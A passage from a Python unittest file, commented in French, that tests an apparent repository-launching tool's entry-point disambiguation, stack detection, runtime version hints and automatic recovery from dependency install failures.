            self.assertFalse(Path(f"/tmp/ztsb_private_{os.getpid()}").exists())   # /tmp du sandbox ≠ /tmp de l'hôte


class TestEntryDisambiguation(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(c)
        return r

    GO = ["go run ./cmd/api", "go run ./cmd/worker", "go run ./cmd/migrate"]
    RUST = ["cargo run --release --bin server", "cargo run --release --bin cli"]

    def test_dockerfile_entrypoint_wins(self):
        r = self._repo({"Dockerfile": 'FROM golang\nRUN go build ./...\nENTRYPOINT ["/app/api"]\n'})
        self.assertEqual(plan.disambiguate_entry(r, self.GO), ("go run ./cmd/api", "Dockerfile/compose"))

    def test_readme_run_command_in_code_block(self):
        r = self._repo({"README.md": "Intro\n```bash\ncargo run --release --bin server\n```\nLe binaire cli sert à autre chose.\n"})
        self.assertEqual(plan.disambiguate_entry(r, self.RUST), ("cargo run --release --bin server", "README"))

    def test_prose_mention_is_not_evidence(self):
        r = self._repo({"README.md": "Le serveur `api` et le `worker` tournent ensemble.\n"})
        self.assertIsNone(plan.disambiguate_entry(r, self.GO))

    def test_tie_stays_ambiguous(self):
        r = self._repo({"README.md": "```\ngo run ./cmd/api\ngo run ./cmd/worker\n```\n"})
        self.assertIsNone(plan.disambiguate_entry(r, self.GO))

    def test_docker_beats_readme(self):
        r = self._repo({"Dockerfile": 'CMD ["/app/worker"]\n', "README.md": "```\ngo run ./cmd/api\n```\n"})
        self.assertEqual(plan.disambiguate_entry(r, self.GO)[0], "go run ./cmd/worker")

    def test_name_must_be_a_whole_word(self):
        r = self._repo({"Dockerfile": 'ENTRYPOINT ["/app/api-gateway"]\n'})
        self.assertIsNone(plan.disambiguate_entry(r, self.GO))          # « api » n'est pas « api-gateway »

    def test_no_evidence_no_choice(self):
        self.assertIsNone(plan.disambiguate_entry(self._repo({"x": "y"}), self.GO))

    def test_make_plan_applies_it_with_a_note(self):
        r = self._repo({"go.mod": "module x\ngo 1.22\n", "cmd/api/main.go": "package main\nfunc main(){}\n",
                        "cmd/worker/main.go": "package main\nfunc main(){}\n", "Dockerfile": 'ENTRYPOINT ["/app/api"]\n'})
        ctx = core.make_plan(r)
        self.assertEqual(ctx.plan.run, "go run ./cmd/api")
        self.assertFalse(ctx.plan.choices)
        self.assertTrue(any("choisi d'après le Dockerfile" in n for n in ctx.plan.notes))


    def test_name_used_as_an_argument_or_path_is_not_evidence(self):
        r = self._repo({"README.md": "```\ncargo run --bin config-check -- --config server/config.json\n```\n"})
        self.assertIsNone(plan.disambiguate_entry(r, self.RUST))        # « server » est un argument, pas la cible
        r2 = self._repo({"README.md": "```\ncd ./cli && make\n```\n"})
        self.assertIsNone(plan.disambiguate_entry(r2, self.RUST))       # « ./ » seul ne prouve rien

    def test_target_forms_are_recognized(self):
        self.assertEqual(plan.disambiguate_entry(self._repo({"README.md": "```\n./target/release/server --port 1\n```\n"}), self.RUST)[0],
                         "cargo run --release --bin server")
        self.assertEqual(plan.disambiguate_entry(self._repo({"README.md": "```\ngo build -o bin/api ./cmd/api\n```\n"}), self.GO)[0],
                         "go run ./cmd/api")
        self.assertEqual(plan.disambiguate_entry(self._repo({"README.md": "```\n$ python train.py --epochs 3\n```\n"}),
                                                 ["python train.py", "python sample.py"])[0], "python train.py")

    def test_docker_name_as_directory_is_not_evidence(self):
        r = self._repo({"Dockerfile": 'CMD ["--config", "/etc/api/config.json", "/app/worker"]\n'})
        self.assertEqual(plan.disambiguate_entry(r, self.GO)[0], "go run ./cmd/worker")


class TestNestedMultiStack(unittest.TestCase):
    def _mono(self, base):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        be, fe = r / base / "backend", r / base / "frontend"
        be.mkdir(parents=True), fe.mkdir(parents=True)
        (be / "requirements.txt").write_text("flask\n")
        (be / "app.py").write_text("print(1)\n")
        (fe / "package.json").write_text(json.dumps({"scripts": {"start": "node s.js"}}))
        return r

    def test_backend_and_frontend_under_src_or_apps_are_found(self):
        for base in ("src", "apps", "app"):
            stacks = plan.detect_stacks(self._mono(base))
            self.assertEqual(sorted(n for n, _, _ in stacks), ["backend", "frontend"], base)

    def test_top_level_layout_still_works(self):
        r = self._mono("")
        self.assertEqual(sorted(n for n, _, _ in plan.detect_stacks(r)), ["backend", "frontend"])

    def test_app_container_is_not_a_stack_itself(self):
        r = self._mono("app")
        names = [n for n, _, _ in plan.detect_stacks(r)]
        self.assertNotIn("app", names)

    def test_same_language_stacks_are_not_multistack(self):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n in ("backend", "frontend"):
            (r / "src" / n).mkdir(parents=True)
            (r / "src" / n / "package.json").write_text(json.dumps({"scripts": {"start": "node x.js"}}))
        self.assertEqual(plan.detect_stacks(r), [])

    def test_cli_runs_all_stacks_automatically_for_a_small_multistack_monorepo(self):
        import subprocess
        r = self._mono("src")
        out = subprocess.run([sys.executable, "-m", "zerodev", "plan", str(r)], capture_output=True, text=True, timeout=60,
                             env={**os.environ, "PYTHONPATH": str(ROOT / "src"), "ZERO_HOME": str(r / "zh")})
        self.assertIn("monorepo multi-stack détecté", out.stdout + out.stderr)
        self.assertIn("stack « backend »", out.stdout + out.stderr)


class TestWaitForDisk(unittest.TestCase):
    def test_returns_immediately_when_there_is_room(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertTrue(bench.wait_for_disk(Path(d), min_mb=1, max_wait=2))

    def test_gives_up_after_the_delay_when_there_is_never_room(self):
        import time
        with tempfile.TemporaryDirectory() as d:
            t = time.time()
            self.assertFalse(bench.wait_for_disk(Path(d), min_mb=10 ** 9, max_wait=1))
            self.assertLess(time.time() - t, 6)


class TestStrictRate(unittest.TestCase):
    def test_all_last_resort_heuristics_are_excluded_from_the_strict_rate(self):
        rows = [{"repo": "a", "status": "runnable", "detected": True, "lang": "go", "run_inferred": True},
                {"repo": "b", "status": "runnable", "detected": True, "lang": "go", "entry_from_docs": True},
                {"repo": "c", "status": "runnable", "detected": True, "lang": "python", "deps_deduced": True},
                {"repo": "d", "status": "runnable", "detected": True, "lang": "node"},
                {"repo": "e", "status": "no_run_command", "detected": False, "lang": "node"}]
        s = bench.summarize(rows, False)
        self.assertEqual((s["inferred_from_makefile"], s["entry_from_docs"], s["deps_deduced"]), (1, 1, 1))
        self.assertEqual(s["detection_rate_of_cloned"], 0.8)
        self.assertEqual(s["detection_rate_strict_of_cloned"], 0.2)


class TestEntryDisambiguationNeedsEvidence(unittest.TestCase):
    def test_a_single_parsable_choice_without_any_evidence_is_not_chosen(self):
        with tempfile.TemporaryDirectory() as d:
            # un seul nom exploitable, zéro preuve : jamais de choix « par défaut »
            self.assertIsNone(plan.disambiguate_entry(Path(d), ["go run ./cmd/api", "choix sans nom exploitable"]))
            self.assertEqual(plan.entry_evidence(Path(d), ["go run ./cmd/api"]), {"go run ./cmd/api": 0})


class TestExportZip(unittest.TestCase):
    def test_suspect_pattern_catches_build_artifacts_but_not_source(self):
        sys.path.insert(0, str(ROOT / "scripts"))
        try:
            import export_zip
        finally:
            sys.path.pop(0)
        for bad in ("build/lib/x.py", "src/zerodev/__pycache__/a.pyc", "dist/zero.pyz", "a/b.egg-info/PKG-INFO", "x/node_modules/y.js", "m.pyc"):
            self.assertTrue(export_zip.SUSPECT.search(bad), bad)
        for good in ("src/zerodev/plan.py", "docs/CHANGELOG.md", "benchmark/results/x.json", "scripts/build_pyz.py", "tests/test_zerodev.py"):
            self.assertFalse(export_zip.SUSPECT.search(good), good)


class TestCorepackAndPnpmBuilds(unittest.TestCase):
    COREPACK = ("Error: Error when performing the request to https://repo.yarnpkg.com/4.18.1/packages/yarnpkg-cli/bin/yarn.js; "
                "for troubleshooting help, see https://github.com/nodejs/corepack#troubleshooting")

    def test_corepack_fetch_failure_switches_to_the_npm_registry(self):
        self.assertEqual(recovery.diagnose_corepack(self.COREPACK), {"COREPACK_NPM_REGISTRY": "https://registry.npmjs.org"})

    def test_user_registry_is_respected(self):
        os.environ["npm_config_registry"] = "https://npm.corp.example/"
        self.addCleanup(os.environ.pop, "npm_config_registry", None)
        self.assertEqual(recovery.diagnose_corepack(self.COREPACK)["COREPACK_NPM_REGISTRY"], "https://npm.corp.example/")

    def test_other_errors_do_not_trigger_it(self):
        self.assertIsNone(recovery.diagnose_corepack("npm error code E404"))
        self.assertIsNone(recovery.diagnose_corepack(""))

    def test_pnpm_ignored_builds_gets_ignore_scripts(self):
        tail = "Error: ERR_PNPM_IGNORED_BUILDS\n  Ignored build scripts: esbuild@0.18.20"
        self.assertEqual(recovery.diagnose_node_scripts("pnpm install", tail), "pnpm install --config.strict-dep-builds=false")
        self.assertIsNone(recovery.diagnose_node_scripts("pnpm install --config.strict-dep-builds=false", tail))     # une seule fois
        # --ignore-scripts n'évite pas cette erreur chez pnpm : on ne le propose pas dans ce cas
        self.assertNotIn("--ignore-scripts", recovery.diagnose_node_scripts("pnpm install", tail))


class TestManagePyInSubdir(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(c)
        return r

    DJ = "import os\nfrom django.core.management import execute_from_command_line\n"

    def test_root_manage_py_wins(self):
        self.assertEqual(plan.find_manage_py(self._repo({"manage.py": "x", "sub/manage.py": self.DJ})), "manage.py")

    def test_single_django_manage_py_in_a_subfolder(self):
        self.assertEqual(plan.find_manage_py(self._repo({"proj/manage.py": self.DJ})), "proj/manage.py")
        self.assertEqual(plan.find_manage_py(self._repo({"src/manage.py": "from flask_script import Manager\n"})), "src/manage.py")

    def test_ambiguity_unrelated_content_and_skipped_dirs_give_nothing(self):
        self.assertIsNone(plan.find_manage_py(self._repo({"a/manage.py": self.DJ, "b/manage.py": self.DJ})))
        self.assertIsNone(plan.find_manage_py(self._repo({"proj/manage.py": "print('autre chose')\n"})))
        self.assertIsNone(plan.find_manage_py(self._repo({"docs/manage.py": self.DJ, "node_modules/manage.py": self.DJ})))

    def test_plan_runs_it_from_the_root_with_a_relative_path(self):
        r = self._repo({"requirements.txt": "django\n", "proj/manage.py": self.DJ})
        self.assertEqual(plan.detect_python(r).run, "python proj/manage.py runserver")

    def test_collectstatic_uses_the_subfolder_manage_py(self):
        r = self._repo({"requirements.txt": "django\n", "proj/manage.py": self.DJ, "proj/site/settings.py": "STATIC_ROOT = 'x'\n"})
        steps = [s for s in plan.detect_python(r).install if "collectstatic" in s]
        self.assertEqual(len(steps), 1)
        self.assertIn("proj/manage.py collectstatic", steps[0])

    def test_migrate_condition_follows_the_subfolder(self):
        r = self._repo({"requirements.txt": "django\n", "proj/manage.py": self.DJ})
        pl = plan.Plan("python", None, "x", [], "python proj/manage.py runserver")
        pg = [services.Service("postgres", "x", 5432, 5432, {}, {})]
        self.assertTrue(core.should_migrate(r, pl, pg, {"DATABASE_URL": "x"}))


class TestOldPinBuildFallback(unittest.TestCase):
    PYYAML = ("  \u00d7 Failed to build `pyyaml==5.4`\n  lib/python3.12/site-packages/setuptools/_distutils/command/sdist.py\n"
              "AttributeError: 'build_ext' object has no attribute 'cython_sources'")

    def _p(self, version=None):
        return plan.Plan("python", version, "x", [], "x")

    def test_old_pinned_package_that_fails_to_build(self):
        self.assertEqual(recovery.old_pin_build_failure(self.PYYAML), ("pyyaml", "5.4"))

    def test_not_for_missing_system_headers_python2_or_unpinned(self):
        self.assertIsNone(recovery.old_pin_build_failure("Failed to build `psycopg2==2.8.5`\nfatal error: libpq-fe.h: No such file or directory"))
        self.assertIsNone(recovery.old_pin_build_failure("Failed to build `x==1.0`\nMissing parentheses in call to 'print'"))
        self.assertIsNone(recovery.old_pin_build_failure("Failed to build `avibe @ file:///tmp/avibe`"))

    def test_ladder_goes_to_39_then_38_then_stops(self):
        self.assertEqual(recovery.diagnose_python_install(self._p(), self.PYYAML), "3.9")
        t39 = self.PYYAML.replace("python3.12", "python3.9")
        self.assertEqual(recovery.diagnose_python_install(self._p("3.9"), t39), "3.8")
        t38 = self.PYYAML.replace("python3.12", "python3.8")
        self.assertIsNone(recovery.diagnose_python_install(self._p("3.8"), t38))

    def test_never_goes_below_the_projects_floor(self):
        self.assertIsNone(recovery.diagnose_python_install(self._p(">=3.10"), self.PYYAML))
        self.assertEqual(recovery.diagnose_python_install(self._p(">=3.8"), self.PYYAML), "3.9")

    def test_abi_tag_logic_keeps_priority(self):
        tail = self.PYYAML + "\nwith the following Python ABI tags: `cp311`, `cp312`, `cp313`\nYou require CPython 3.14"
        self.assertEqual(recovery.diagnose_python_install(self._p(">=3.11"), tail), "3.13")


class TestPyApiBreaks(unittest.TestCase):
    def _fixes(self, tail):
        with tempfile.TemporaryDirectory() as d:
            return recovery.diagnose(plan.Plan("python", None, "x", [], "x"), Path(d), tail, set())

    def test_known_breaks_map_to_version_caps(self):
        cases = {
            "ImportError: cannot import name 'escape' from 'jinja2' (/x/jinja2/__init__.py)": "jinja2<3.1",
            "ImportError: cannot import name 'soft_unicode' from 'markupsafe'": "markupsafe<2.1",
            "ImportError: cannot import name 'BaseResponse' from 'werkzeug.wrappers'": "werkzeug<2.1",
            "ImportError: cannot import name 'url_quote' from 'werkzeug.urls'": "werkzeug<3",
            "ImportError: cannot import name 'Markup' from 'flask'": "flask<2.3",
            "ImportError: cannot import name 'TextField' from 'wtforms'": "wtforms<3",
            "ImportError: cannot import name 'json' from 'itsdangerous'": "itsdangerous<2.1",
            "AttributeError: module 'sqlalchemy' has no attribute '__all__'": "sqlalchemy<2",
            "AttributeError: 'Engine' object has no attribute 'execute'": "sqlalchemy<2",
        }
        for tail, pin in cases.items():
            cmds = " ".join(c for f in self._fixes(tail) for c in f.commands)
            self.assertIn(pin, cmds, tail)
            self.assertIn("uv pip install", cmds)

    def test_unrelated_import_errors_and_other_languages_do_nothing(self):
        self.assertEqual([f for f in self._fixes("ImportError: cannot import name 'foo' from 'bar'") if "API retirée" in f.description], [])
        with tempfile.TemporaryDirectory() as d:
            fx = recovery.diagnose(plan.Plan("node", None, "x", [], "x"), Path(d), "cannot import name 'escape' from 'jinja2'", set())
            self.assertEqual([f for f in fx if "API retirée" in f.description], [])

    def test_an_already_applied_fix_is_not_repeated(self):
        with tempfile.TemporaryDirectory() as d:
            pl = plan.Plan("python", None, "x", [], "x")
            tail = "ImportError: cannot import name 'escape' from 'jinja2'"
            first = [f for f in recovery.diagnose(pl, Path(d), tail, set()) if "API retirée" in f.description]
            again = [f for f in recovery.diagnose(pl, Path(d), tail, {first[0].key}) if "API retirée" in f.description]
            self.assertEqual((len(first), len(again)), (1, 0))


class TestOldFlaskWholeSet(unittest.TestCase):
    TAIL = "ImportError: cannot import name 'escape' from 'jinja2' (/x/jinja2/__init__.py)"

    def _cmds(self, flask_is_old):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d, mock.patch.object(recovery, "installed_flask_is_old", return_value=flask_is_old):
            fx = recovery.diagnose(plan.Plan("python", None, "x", [], "x"), Path(d), self.TAIL, set())
        return " ".join(c for f in fx if "API retirée" in f.description for c in f.commands)

    def test_old_flask_gets_the_whole_coherent_set_at_once(self):
        cmds = self._cmds(True)
        for pin in ("flask<2.1", "werkzeug<2.1", "jinja2<3.1", "itsdangerous<2.1", "markupsafe<2.1"):
            self.assertIn(pin, cmds)

    def test_modern_flask_only_gets_the_single_cap(self):
        cmds = self._cmds(False)
        self.assertIn("jinja2<3.1", cmds)
        self.assertNotIn("flask<2.1", cmds)

    def test_installed_flask_version_detection_handles_a_missing_interpreter(self):
        self.assertFalse(recovery.installed_flask_is_old(Path("/nonexistent/python")))


class TestVeryOldFlask(unittest.TestCase):
    def test_top_level_werkzeug_imports_map_to_the_2018_set_not_the_2021_one(self):
        with tempfile.TemporaryDirectory() as d:
            tail = "ImportError: cannot import name 'url_encode' from 'werkzeug' (/x/werkzeug/__init__.py)"
            fx = [f for f in recovery.diagnose(plan.Plan("python", None, "x", [], "x"), Path(d), tail, set()) if "API retirée" in f.description]
            self.assertEqual(len(fx), 1)
            cmd = fx[0].commands[0]
            for pin in ("flask<1.1", "werkzeug<1.0", "jinja2<3.0"):
                self.assertIn(pin, cmd)

    def test_werkzeug_urls_submodule_is_the_modern_case(self):
        with tempfile.TemporaryDirectory() as d:
            tail = "ImportError: cannot import name 'url_quote' from 'werkzeug.urls' (/x/werkzeug/urls.py)"
            cmds = " ".join(c for f in recovery.diagnose(plan.Plan("python", None, "x", [], "x"), Path(d), tail, set()) for c in f.commands)
            self.assertIn("werkzeug<3", cmds)
            self.assertNotIn("werkzeug<1.0", cmds)


class TestConfigExampleCopy(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(c)
        return r

    def test_single_example_next_to_the_missing_module_is_copied(self):
        r = self._repo({"app/local_settings_example.py": "SECRET_KEY='x'\n", "app/__init__.py": ""})
        tail = "AttributeError: module 'app' has no attribute 'local_settings'"
        self.assertEqual(recovery.config_example_copies(r, tail),
                         [("app/local_settings_example.py", "app/local_settings.py")])

    def test_other_naming_styles_and_no_module_error_message(self):
        r = self._repo({"config_local.py.example": "x\n"})
        self.assertEqual(recovery.config_example_copies(r, "ModuleNotFoundError: No module named 'config_local'"),
                         [("config_local.py.example", "config_local.py")])

    def test_never_overwrites_nor_guesses(self):
        tail = "ModuleNotFoundError: No module named 'local_settings'"
        r1 = self._repo({"local_settings_example.py": "a", "local_settings.py": "déjà là"})
        self.assertEqual(recovery.config_example_copies(r1, tail), [])
        r2 = self._repo({"a/local_settings_example.py": "a", "b/local_settings_sample.py": "b"})
        self.assertEqual(recovery.config_example_copies(r2, tail), [])           # deux modèles : ambigu
        self.assertEqual(recovery.config_example_copies(self._repo({"x.py": ""}), tail), [])

    def test_a_real_local_module_is_not_a_config_to_copy(self):
        r = self._repo({"helpers.py": "", "helpers_example.py": ""})
        self.assertEqual(recovery.config_example_copies(r, "ModuleNotFoundError: No module named 'helpers'"), [])

    def test_diagnose_emits_a_cp_dash_n_fix_for_python_only(self):
        r = self._repo({"app/local_settings_example.py": "x"})
        tail = "module 'app' has no attribute 'local_settings'"
        fx = recovery.diagnose(plan.Plan("python", None, "x", [], "x"), r, tail, set())
        cmds = [c for f in fx for c in f.commands if c.startswith("cp -n")]
        self.assertEqual(len(cmds), 1)
        node = recovery.diagnose(plan.Plan("node", None, "x", [], "x"), r, tail, set())
        self.assertFalse([c for f in node for c in f.commands if c.startswith("cp -n")])


class TestRuntimeHint(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(c)
        return r

    GH = "jobs:\n  t:\n    strategy:\n      matrix:\n        python-version: [3.8, \"3.9\", '3.10', pypy-3.9]\n    steps:\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n"

    def test_matrix_gives_the_newest_declared_version_and_ignores_expressions_and_pypy(self):
        r = self._repo({".github/workflows/ci.yml": self.GH})
        self.assertEqual(plan.runtime_hint(r, "python"), ("3.10", ".github/workflows/ci.yml"))     # 3.8, 3.9 en fin de vie, pypy ignorés

    def test_multiline_matrix_list(self):
        r = self._repo({".github/workflows/t.yaml": "        python-version:\n          - '3.10'\n          - '3.11'\n"})
        self.assertEqual(plan.runtime_hint(r, "python")[0], "3.11")

    def test_dockerfile_wins_over_ci(self):
        r = self._repo({"Dockerfile": "FROM python:3.9-slim AS base\nRUN x\n", ".github/workflows/ci.yml": self.GH})
        self.assertEqual(plan.runtime_hint(r, "python"), ("3.9", "Dockerfile"))        # le Dockerfile n'est pas filtré : c'est ce qui est livré
        r2 = self._repo({"Dockerfile": "FROM --platform=linux/amd64 node:20-alpine\n"})
        self.assertEqual(plan.runtime_hint(r2, "node"), ("20", "Dockerfile"))

    def test_node_matrix_is_capped_at_the_current_lts(self):
        r = self._repo({".github/workflows/ci.yml": "        node-version: [16.x, 18.x, 20, 22, 25]\n"})
        self.assertEqual(plan.runtime_hint(r, "node")[0], "22")

    def test_travis_and_gitlab(self):
        self.assertEqual(plan.runtime_hint(self._repo({".travis.yml": "language: python\npython:\n  - \"3.10\"\n  - \"3.12\"\n"}), "python")[0], "3.12")
        self.assertEqual(plan.runtime_hint(self._repo({".travis.yml": "node_js:\n  - 20\n  - 22\n"}), "node")[0], "22")
        self.assertEqual(plan.runtime_hint(self._repo({".gitlab-ci.yml": "build:\n  image: python:3.11-slim\n"}), "python")[0], "3.11")

    def test_nothing_clear_gives_nothing(self):
        self.assertIsNone(plan.runtime_hint(self._repo({"x": "y"}), "python"))
        self.assertIsNone(plan.runtime_hint(self._repo({".github/workflows/ci.yml": "python-version: ${{ vars.PY }}\n"}), "python"))
        self.assertIsNone(plan.runtime_hint(self._repo({"Dockerfile": "FROM ubuntu:22.04\n"}), "node"))

    def test_python_and_node_do_not_borrow_each_others_lines(self):
        r = self._repo({".github/workflows/ci.yml": "        node-version: 20\n"})
        self.assertIsNone(plan.runtime_hint(r, "python"))

    def test_explicit_declarations_still_win_in_the_plan(self):
        r = self._repo({"requirements.txt": "flask\n", "app.py": "print(1)\n", ".python-version": "3.12\n", "Dockerfile": "FROM python:3.9\n"})
        p = plan.detect_python(r)
        self.assertEqual((p.version, p.source), ("3.12", ".python-version"))

    def test_plan_uses_the_hint_and_says_where_it_comes_from(self):
        r = self._repo({"requirements.txt": "flask\n", "app.py": "print(1)\n", "Dockerfile": "FROM python:3.9-slim\n"})
        p = plan.detect_python(r)
        self.assertEqual(p.version, "3.9")
        self.assertIn("Dockerfile", p.source)
        n = self._repo({"package.json": json.dumps({"scripts": {"start": "node a.js"}}), "Dockerfile": "FROM node:18-alpine\n"})
        self.assertEqual(plan.detect_node(n).version, "18")


    def test_unreleased_python_versions_in_a_matrix_are_not_proposed(self):
        r = self._repo({".github/workflows/ci.yml": "        python-version: ['3.11', '3.12', '3.13', '3.14', '3.15']\n"})
        self.assertEqual(plan.runtime_hint(r, "python")[0], "3.14")
        r2 = self._repo({"Dockerfile": "FROM python:3.15-rc\n"})
        self.assertIsNone(plan.runtime_hint(r2, "python"))


    def test_end_of_life_versions_from_ci_are_ignored_so_the_default_applies(self):
        """Mesuré : Node 16 lu dans une CI ancienne cassait l'installation d'un dépôt qui démarrait avec la LTS par défaut."""
        self.assertIsNone(plan.runtime_hint(self._repo({".github/workflows/ci.yml": "        node-version: [14, 16, 18]\n"}), "node"))
        self.assertIsNone(plan.runtime_hint(self._repo({".github/workflows/ci.yml": "        python-version: ['3.7', '3.8', '3.9']\n"}), "python"))
        self.assertEqual(plan.runtime_hint(self._repo({"Dockerfile": "FROM node:16\n"}), "node"), ("16", "Dockerfile"))


class TestBuildCorpusRule(unittest.TestCase):
    def setUp(self):
        sys.path.insert(0, str(ROOT / "benchmark"))
        self.addCleanup(sys.path.remove, str(ROOT / "benchmark"))
        import importlib
        self.m = importlib.import_module("build_corpus_rule")

    def test_query_and_stars_parsing(self):
        self.assertEqual(self.m.build_query("go", 500, 3000), "language:go stars:500..3000 archived:false")
        self.assertEqual(self.m.parse_stars("100..499"), (100, 499))

    def test_pick_dedupes_case_insensitively_and_respects_the_limit(self):
        items = [{"html_url": "https://github.com/A/b"}, {"html_url": "https://github.com/c/d/"}, {"html_url": "https://github.com/e/f"},
                 {"html_url": "https://github.com/g/h"}]
        seen = {"https://github.com/a/b"}
        got = self.m.pick(items, seen, 2)
        self.assertEqual([x["html_url"] for x in got], ["https://github.com/c/d/", "https://github.com/e/f"])
        self.assertIn("https://github.com/c/d", seen)

    def test_read_urls_ignores_comments_and_blank_lines(self):
        with tempfile.TemporaryDirectory() as d:
            f = Path(d) / "c.txt"
            f.write_text("# commentaire\n\nhttps://github.com/X/Y/\n")
            self.assertEqual(self.m.read_urls([str(f)]), {"https://github.com/x/y"})

    def test_the_committed_corpora_follow_the_rule_header(self):
        for name in ("corpus.public500.txt", "corpus.public500b.txt"):
            head = (ROOT / "benchmark" / name).read_text().splitlines()[0]
            self.assertTrue(head.startswith("#"), name)


class TestInstallDepsChain(unittest.TestCase):
    """Tests de caractérisation de `install_deps` : ils figent le comportement de la chaîne de correctifs (ordre, une seule fois, cascade)
    pour qu'on puisse la refactorer sans rien changer. Les étapes sont de petits scripts shell qui échouent avec le message voulu."""

    def _run(self, steps, lang="python", recover=True, files=None, **plan_kw):
        import contextlib
        from unittest import mock
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        root = Path(d.name) / "proj"
        root.mkdir()
        for n, c in (files or {}).items():
            (root / n).write_text(c)
        pl = plan.Plan(lang, None, "x", list(steps), "x", **plan_kw)
        ctx = core.Context(root=root, plan=pl, services=[], gpu={}, fp="x", name="")
        logs: list[str] = []
        env0 = {k: v for k, v in os.environ.items() if k not in ("npm_config_registry", "COREPACK_NPM_REGISTRY", "SETUPTOOLS_SCM_PRETEND_VERSION")}
        env0["ZERO_HOME"] = str(Path(d.name) / "zh")
        old = os.environ.get("ZERO_HOME")
        os.environ["ZERO_HOME"] = env0["ZERO_HOME"]
        try:
            with contextlib.redirect_stdout(io.StringIO()), mock.patch.object(core, "log", side_effect=logs.append), \
                    mock.patch.object(core, "warn", side_effect=logs.append):
                try:
                    env = core.install_deps(ctx, env0, recover)
                    err = None
                except ZeroError as e:
                    env, err = None, str(e)
        finally:
            if old is None:
                os.environ.pop("ZERO_HOME", None)
            else:
                os.environ["ZERO_HOME"] = old
        return env, err, logs, ctx

    def test_all_steps_succeed_without_any_fix(self):
        env, err, logs, _ = self._run(["true", "true"])
        self.assertIsNone(err)
        self.assertFalse([l for l in logs if "correctif" in l])

    def test_failure_without_recovery_dies_at_once(self):
        step = "echo 'Error when performing the request to https://repo.yarnpkg.com/x' >&2; exit 1"
        env, err, logs, _ = self._run([step], recover=False)
        self.assertIn("commande échouée", err)
        self.assertFalse([l for l in logs if "correctif" in l])

    def test_unknown_failure_dies_with_the_failing_step(self):
        env, err, _, _ = self._run(["false"])
        self.assertIn("commande échouée : false", err)

    def test_optional_step_failure_is_only_a_warning(self):
        env, err, logs, _ = self._run(["true", "false"], optional_steps=["false"])
        self.assertIsNone(err)
        self.assertTrue([l for l in logs if "facultative" in l])

    def test_corepack_registry_is_set_in_the_environment_then_install_succeeds(self):
        step = '[ -n "$COREPACK_NPM_REGISTRY" ] || { echo "Error when performing the request to https://repo.yarnpkg.com/x" >&2; exit 1; }'
        env, err, logs, _ = self._run([step], lang="node")
        self.assertIsNone(err)
        self.assertEqual(env["COREPACK_NPM_REGISTRY"], "https://registry.npmjs.org")
        self.assertEqual(len([l for l in logs if "corepack" in l]), 1)

    def test_scm_version_is_imposed_once_and_persists_in_the_environment(self):
        step = '[ -n "$SETUPTOOLS_SCM_PRETEND_VERSION" ] || { echo "UserWarning: x is shallow and may cause errors" >&2; exit 1; }'
        env, err, logs, _ = self._run([step])
        self.assertIsNone(err)
        self.assertEqual(env["SETUPTOOLS_SCM_PRETEND_VERSION"], "0.0.0")

    def test_a_fix_that_does_not_help_is_not_repeated(self):
        step = "echo 'Error when performing the request to https://repo.yarnpkg.com/x' >&2; exit 1"
        env, err, logs, _ = self._run([step], lang="node")
        self.assertIsNotNone(err)
        self.assertEqual(len([l for l in logs if "corepack" in l]), 1)

    def test_npm_ci_step_is_replaced_by_npm_install(self):
        step = "test -f m || { touch m; echo 'npm error code EUSAGE'; exit 1; } # npm ci"
        env, err, logs, ctx = self._run([step], lang="node")
        self.assertIsNone(err)
        self.assertTrue(ctx.plan.install[0].endswith("# npm install"))

    def test_pnpm_ignored_builds_step_is_replaced(self):
        step = "test -f m || { touch m; echo 'Error: ERR_PNPM_IGNORED_BUILDS'; exit 1; } # pnpm install"
        env, err, logs, ctx = self._run([step], lang="node")
        self.assertIsNone(err)
        self.assertTrue(ctx.plan.install[0].endswith("# pnpm install --config.strict-dep-builds=false"))

    def test_soft_step_is_skipped_only_when_another_step_follows(self):
        env, err, logs, ctx = self._run(["false", "true"], soft_steps=["false"])
        self.assertIsNone(err)
        self.assertEqual(ctx.plan.install, ["true"])
        env, err, _, _ = self._run(["false"], soft_steps=["false"])
        self.assertIn("commande échouée", err)

    def test_editable_self_install_is_skipped_after_a_requirements_step(self):
        steps = ["echo ok -r req.txt", "false -e ."]
        env, err, logs, ctx = self._run(steps)
        self.assertIsNone(err)
        self.assertEqual(ctx.plan.install, ["echo ok -r req.txt"])
        env, err, _, _ = self._run(["false -e ."])                       # seul : requis
        self.assertIn("commande échouée", err)

    PSY = ("sh -c 'grep -q \"%s\" \"$2\" && { echo \"fatal error: libpq-fe.h: No such file or directory\"; exit 1; }; exit 0' _ -r requirements.txt")

    def test_psycopg2_source_package_is_swapped_for_the_binary_one(self):
        env, err, logs, ctx = self._run([self.PSY % "^psycopg2=="], files={"requirements.txt": "flask\npsycopg2==2.9.9\n"})
        self.assertIsNone(err)
        self.assertTrue([l for l in logs if "psycopg2-binary" in l and "libpq absente" in l])
        self.assertIn(".requirements.txt", ctx.plan.install[0])

    def test_psycopg2_binary_pin_without_wheel_cascades_to_unpinning_in_the_same_round(self):
        env, err, logs, ctx = self._run([self.PSY % "psycopg2-binary=="], files={"requirements.txt": "psycopg2-binary==2.8.5\n"})
        self.assertIsNone(err)
        self.assertEqual(len([l for l in logs if "pin retiré" in l]), 1)
